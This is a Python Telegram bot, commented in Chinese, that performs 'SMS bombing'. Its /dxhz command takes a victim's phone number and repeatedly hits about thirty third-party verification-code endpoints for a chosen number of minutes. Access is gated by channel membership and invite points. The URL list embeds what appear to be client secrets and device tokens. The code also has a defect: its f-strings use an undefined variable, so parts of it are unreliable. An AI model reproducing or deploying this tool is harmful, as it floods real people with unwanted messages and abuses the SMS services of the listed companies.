import os
import requests
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    CommandHandler, CallbackContext, Updater
)
from threading import Thread

# 从环境变量中读取 TELEGRAM_API_TOKEN
TELEGRAM_API_TOKEN = os.getenv("TELEGRAM_API_TOKEN")

# 定义短信接口 URL 列表
urls = [
    f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={idcard}",
    f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={idcard}",
    f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={idcard}",
    f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={idcard}&type=register",
    f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
    f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={idcard}",
    f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={idcard}",
    f"https://api.huandian.cloud/sms?phone={idcard}&serverKey=qishou",
    f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={idcard}",
    f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={idcard}&token=&v=4.1.2023080601",
    f"https://bike.ledear.cn/api/user/code?phone={idcard}&brandAreaId=1279",
    f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{idcard}",
    f"https://api.dycxqc.com/user/logon/verifyCode/{idcard}",
    f"https://api.workdodo.com/czj/sys/open/sms/sendSms?sign=1727138418931&mobile={idcard}&sendType=1",
    f"https://isus.vip/cgi.sms.send?mobile={idcard}",
    f"https://wechatapp.baofengenergy.com:5022/pms/appLogin/code?phone={idcard}&isRegister=true",
    f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={idcard}&type=1",
    f"https://bsx.baoding12345.cn/web/bduser/register?mobile={idcard}",
    f"https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone={idcard}&Captcha=&_=1627172292814",
    f"http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={idcard}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347",
    f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={idcard}&sign_type=1&use_type=1",
    f"https://maicai.api.ddxq.mobi/user/getSms?uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.27.1&app_version=4.27.1&channel=applet&app_client_id=4&s_id=05hv9hv42g516917y9339ygy8033yyuyofpi536h55v7y2lezfz883wuj54g5829&openid=osP8I0Wmck0hGvKW9vwKHweXabkM&device_id=osP8I0Wmck0hGvKW9vwKHweXabkM&h5_source=&time=1727040562&device_token=WHJMrwNw1k%2FHZDgtawYdgIsh8E%2Fwdbj66furLzNpFRvp5A2rzSGbKhTz9JeO6ELOoGTzJZ436JhQ9V96N7H4JAuMcB7Y6GWPadCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile={idcard}&verify_code=&type=3&area_code=86&showData=true&app_client_name=wechat&nars=c51c84e76a3425e745d7e58dcfa5ba39&sesi=%7B%22sesiT%22%3A%22AEWLMUUa99456528bc9105603557ab27af4a0fe%22%2C%22sdkV%22%3A%222.0.0%22%7D",
    f"https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone={idcard}&user_type=2",
    f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={idcard}",
    f"https://apis.niuxuezhang.cn/v1/sms-code?phone={idcard}",
    f"https://wccy-server.sxlyb.com/open/v1/login-code/{idcard}?phone={idcard}",
    f"https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel={idcard}&v=9.0&os=Windows",
    f"https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile={idcard}",
    f"https://www.huameitang.com/api.php?do=getMobileCode&mobile={idcard}",
    f"https://api.hichefu.com/client-openapi/driver/user/getVerifyCode?phone={idcard}",
    f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={idcard}",
    f"http://n103.top:84/smsboom/?hm={idcard}",
]

# 定义频道的用户名（没有 @ 符号）
CHANNEL_USERNAME = 'pubgtianshenkar'

# 初始化用户积分系统
user_points = {}
invite_links = {}
user_invites = {}

def start(update, context):
    keyboard = [[InlineKeyboardButton("天神主频道", url="https://t.me/{}".format(CHANNEL_USERNAME))]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "请加入主频道后才使用此机器人",
        reply_markup=reply_markup
    )

def check_user_in_channel(context, user_id):
    try:
        chat_member = context.bot.get_chat_member(chat_id="@{}".format(CHANNEL_USERNAME), user_id=user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

def add_points(inviter_id, points=2):
    user_points[inviter_id] = user_points.get(inviter_id, 0) + points
    user_invites[inviter_id] = user_invites.get(inviter_id, 0) + 1

def share(update, context):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "未设置用户名"

    if user_id not in invite_links:
        invite_links[user_id] = "https://t.me/{}?start={}".format(context.bot.username, user_id)

    points = user_points.get(user_id, 0)
    invites = user_invites.get(user_id, 0)

    update.message.reply_text(
        "用户名: {}\n"
        "你的专属邀请链接是: {}\n"
        "你已邀请: {} 人\n"
        "你的积分: {}".format(username, invite_links[user_id], invites, points)
    )

def handle_invitation(update, context):
    user_id = update.message.from_user.id
    inviter_id = context.args[0] if context.args else None

    if not check_user_in_channel(context, user_id):
        update.message.reply_text("请先加入频道后再使用此命令！")
        return

    if inviter_id and inviter_id.isdigit():
        add_points(int(inviter_id), points=2)
        update.message.reply_text("感谢加入！已获得2积分。")

def bombard_phone(idcard, duration_minutes):
    end_time = time.time() + duration_minutes * 60
    while time.time() < end_time:
        for url in urls:
            try:
                full_url = url.format(idcard=idcard)
                response = requests.get(full_url)
                if response.status_code == 200:
                    print("请求成功: {}".format(full_url))
                else:
                    print("请求失败: {} - 状态码: {}".format(full_url, response.status_code))
            except Exception as e:
                print("请求错误: {} - 错误信息: {}".format(url, e))
        time.sleep(10)

def dxhz(update, context):
    user_id = update.message.from_user.id

    if not check_user_in_channel(context, user_id):
        update.message.reply_text("请先加入频道后再使用此命令！")
        return

    if len(context.args) < 1:
        update.message.reply_text("请提供一个手机号！正确用法：/dxhz 12345678901 [分钟数]")
        return

    idcard = context.args[0]
    duration_minutes = int(context.args[1]) if len(context.args) > 1 else 5

    required_points = duration_minutes // 5

    if user_points.get(user_id, 0) < required_points:
        update.message.reply_text("您的积分不足，请分享您的邀请链接以获取更多积分。")
        return

    user_points[user_id] -= required_points

    update.message.reply_text("正在对手机号 {} 进行短信轰炸，持续 {} 分钟...".format(idcard, duration_minutes))

    Thread(target=bombard_phone, args=(idcard, duration_minutes)).start()

def main():
    updater = Updater(token=TELEGRAM_API_TOKEN)

    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(CommandHandler("share", share))
    updater.dispatcher.add_handler(CommandHandler("dxhz", dxhz))
    updater.dispatcher.add_handler(CommandHandler("start", handle_invitation))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
